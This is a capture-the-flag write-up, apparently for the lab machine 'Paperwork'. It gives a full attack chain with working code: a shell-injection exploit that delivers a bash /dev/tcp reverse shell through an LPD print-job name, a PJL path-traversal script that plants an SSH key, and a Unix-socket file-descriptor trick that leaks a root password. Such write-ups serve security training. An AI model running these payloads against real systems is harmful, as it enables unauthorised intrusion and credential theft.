
<img src="Images/logo%20paperwork.png" width="275" alt="logo paperwork">

# Attack Chain

```
80 → paperwork.htb → downloadable archive → server.py source leak
	└─► server.py → command injection
		└─► quote breakout via the 'J' line of the LPD control file
			└─► reverse shell → shell as lp
				└─► ss -ltnp / ps aux → 9100 jetdirect.py running as archivist
					└─► PJL FSDOWNLOAD + path traversal 
						└─► NAME="0:/../.ssh/authorized_keys" → write public key
							└─► ssh -i id_rsa archivist → user.txt
								└─► /run/paperwork/mgmt.sock → root + writable
									└─► inject "FSUPLOAD trigger-lockdown"
											└─► connect socket → recvmsg(SCM_RIGHTS) → FD of /etc/paperwork/admin_pins.conf (opened by root)
												└─► os.pread(fd) with no perm re-check → ADMIN_PASSWORD
													└─► ssh root (password reuse) → root.txt
```

# Summary

- [Enumeration](#enumeration)
- [Web](#web)
- [Lateral Movement](#lateral-movement)
- [Privilege Escalation](#privilege-escalation)

---
# Enumeration

```
nmap -sVC -p- 10.129.33.36 -oA nmap

PORT     STATE SERVICE        VERSION
22/tcp   open  ssh            OpenSSH 10.0p2 Ubuntu 5ubuntu5.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http           nginx 1.28.0 (Ubuntu)
|_http-title: Intranet | Document Archiving Service
|_http-server-header: nginx/1.28.0 (Ubuntu)
1515/tcp open  ifor-protocol?
| fingerprint-strings: 
|   TerminalServer, TerminalServerCookie: 
|_    Archive_Printer is ready and printing.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1515-TCP:V=7.95%I=7%D=7/15%Time=6A573AF9%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,27,"Archive_Printer\x20is\x20ready\x20and\x20printin
SF:g\.\n")%r(TerminalServer,27,"Archive_Printer\x20is\x20ready\x20and\x20p
SF:rinting\.\n");

```

There are 3 open ports.

We have a redirection to `paperwork.htb`, let's add it to our `/etc/hosts` file.

```
echo '10.129.33.36 paperwork.htb' | tee -a /etc/hosts
```

# Web

Let's inspect the website first.

![web paperwork](Images/web%20paperwork.png)

We land on a page mentioning a spooler, and we can download an archive file.

A quick inspection reveals it contains **server.py**, with the following code:

```python
cat server.py 
import socket
import threading
import subprocess
import subprocess

VALID_QUEUE = os.environ.get("LPD_QUEUE")

class LpdHandler(threading.Thread):

    def __init__(self, sock, addr):
        super().__init__()
        self.sock = sock
        self.addr = addr
        self.id = f"[lpd-{addr[1]}]"

    def run(self):
        try:
            data = self.sock.recv(1024)
            if not data: return
            
            command = data[0]
            
            if command == 2:
                self.handle_print_job(data)
            elif command in (3, 4):
                self.sock.send(b"Archive_Printer is ready and printing.\n")
                
        except Exception as e:
            print(f"{self.id} Error: {e}")
        finally:
            self.sock.close()

    def handle_print_job(self, data):
        queue = data[1:].decode().strip()
        
        if queue not in VALID_QUEUE:
            print(f"{self.id} Rejected: Invalid queue '{queue}'")
            self.sock.send(b'\x01') 
            return
        print(f"{self.id} Accepted job for queue: {queue}")
        while True:
            chunk = self.sock.recv(1024)
            if not chunk: break
            
            subcommand = chunk[0]
            self.sock.send(b'\x00') 
                parts = chunk[1:].decode(errors='ignore').split()
                if not parts: continue
                
                size = int(parts[0])
                content = b""
                while len(content) < size:
                    content += self.sock.recv(size - len(content) + 1)
                
                decoded_content = content.decode(errors='ignore')
                
                job_name = "Unknown"
                for line in decoded_content.split('\n'):
                    line = line.strip()
                    if line.startswith('J'):
                        job_name = line[1:]
                        break
                
                print(f"{self.id} Executing archive for: {job_name}")
                subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
                
                self.sock.send(b'\x00') 
                self.sock.send(b'\x00')
                while self.sock.recv(4096):
                    pass
                break

class LpdServer:

    def __init__(self, ip='0.0.0.0', port=1515):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((ip, port))
        self.server.listen(100)
        print(f"[*] LPD Server listening on {port}")

    def run(self):
        while True:
            sock, addr = self.server.accept()
            LpdHandler(sock, addr).start()

if __name__ == "__main__":
    LpdServer(port=1515).run()

```

Inspecting the source, we notice we can likely achieve **Command Execution** through this line:

```
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```

To exploit the vulnerability, we can use the following script.

**exploit.py**
```
#!/usr/bin/env python3
import socket, sys, time, base64

TARGET, PORT = sys.argv[1], 1515
LHOST, LPORT = "10.10.14.67", 6767        # <-- ton IP tun0

CMD  = f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"
b64  = base64.b64encode(CMD.encode()).decode()
job  = f"'; echo {b64} | base64 -d | bash; echo '"

control = f"Hattacker\nProot\nJ{job}\n".encode()
size = len(control)

s = socket.socket(); s.connect((TARGET, PORT))
s.send(b"\x02\n")                                    # Receive job, queue vide
time.sleep(0.2)
s.send(b"\x02" + f"{size} cfA001attacker\n".encode())# Receive control file
s.recv(1)                                            # ACK \x00 -> aligne les recv
s.send(control)                                      # corps du control file
time.sleep(0.5); s.close()
print("[+] payload sent, check listener")
```

Once triggered, we should get a reverse shell.

```
penelope -i tun0 -p 6767

lp@paperwork:/opt/LPDServer$ 
```

# Lateral Movement

Let's enumerate what's running on the target.

```
ss -ltnp

State           Recv-Q          Send-Q                    Local Address:Port                                             
LISTEN          0               4096                            0.0.0.0:22                                                  
LISTEN          0               511                             0.0.0.0:80                                                            
LISTEN          0               128                           127.0.0.1:1337                                                            
LISTEN          0               4096                      127.0.0.53%lo:53                                                             
LISTEN          0               100                           127.0.0.1:9100                                                         
LISTEN          0               4096                         127.0.0.54:53                                                               
LISTEN          0               100                             0.0.0.0:1515               
LISTEN          0               4096                               [::]:22
```

We can see a port we haven't inspected yet, port 9100

Looking at the running processes, we see that it's running as `archivist`.

```
ps aux

<SNIP>

archivi+     982  0.0  0.4  28040 17572 ?        Ss   07:21   0:00 /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ /home/archivist/

<SNIP>
```

We can interact with the printer and write our SSH key into `archivist`'s `.ssh`, allowing us to connect over ssh as that user.

```
ssh-keygen -t rsa -b 4096
base64 -w 0 id_rsa.pub
```

Then we can use the following script to write our key.

```
cat > /tmp/pjl.py << 'EOF'
import socket, base64
pub = base64.b64decode("<Base64>") + b"\n"
body = b"@PJL FSDOWNLOAD NAME=\"0:/../.ssh/authorized_keys\" SIZE=%d\r\n" % len(pub) + pub
s = socket.socket()
s.connect(("127.0.0.1", 9100))
s.send(b"\x1b%-12345X" + body + b"\x1b%-12345X\r\n")
try:
    print("REPONSE:", s.recv(200))
except Exception as e:
    print("pas de reponse:", e)
s.close()
EOF
```

And we run the script.

```
python3 pjl.py 

REPONSE: b'OK\r\n'
```

Once it has been launched, we can connect over SSH as `archivist`.

```
ssh -i id_rsa archivist@paperwork.htb

archivist@paperwork:~$
```

# Privilege Escalation

```
./linpeas.sh

<SNIP>

/run/paperwork/mgmt.sock
  └─(Read Write )
  └─(Owned by root)
  └─High risk: root-owned and writable Unix socket

<SNIP>
```

The management daemon (`paperwork-daemon`) uses `sendmsg` with `SCM_RIGHTS` to pass file descriptors when a lockdown is triggered. The admin password is stored in `/etc/paperwork/admin_pins.conf` and the daemon passes that file's file descriptor to the client if a malicious pattern (`FSQUERY`, `FSUPLOAD`, `FSDOWNLOAD`) appears in the log file `/home/archivist/printer/logs/commands.log`.

Knowing that, we can trigger the lockdown and receive the content of `/etc/paperwork/admin_pins.conf` with that command.

```
python3 -c "
import socket, array, os
LOG='/home/archivist/printer/logs/commands.log'
SOCK='/run/paperwork/mgmt.sock'
with open(LOG,'a') as f: f.write('FSUPLOAD trigger-lockdown\n')
s=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(SOCK)
fds=array.array('i')
msg, anc, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(2*fds.itemsize))
for level, ctype, cdata in anc:
    if level == socket.SOL_SOCKET and ctype == socket.SCM_RIGHTS:
        cdata = cdata[:len(cdata) - (len(cdata) % fds.itemsize)]
        fds.frombytes(cdata)
for fd in fds:
    data = os.pread(fd, 4096, 0).decode(errors='ignore')
    if 'ADMIN_PASSWORD=' in data:
        print(data.split('ADMIN_PASSWORD=')[1].split('\n')[0].strip())
s.close()
"
ApparelMortuaryCedar22
```

Let's try to connect as `root` with that password.

```
ssh root@paperwork.htb
root@paperwork.htb's password: ApparelMortuaryCedar22

root@paperwork:~# 
```

> [!TIP]
> **Machine Rooted**

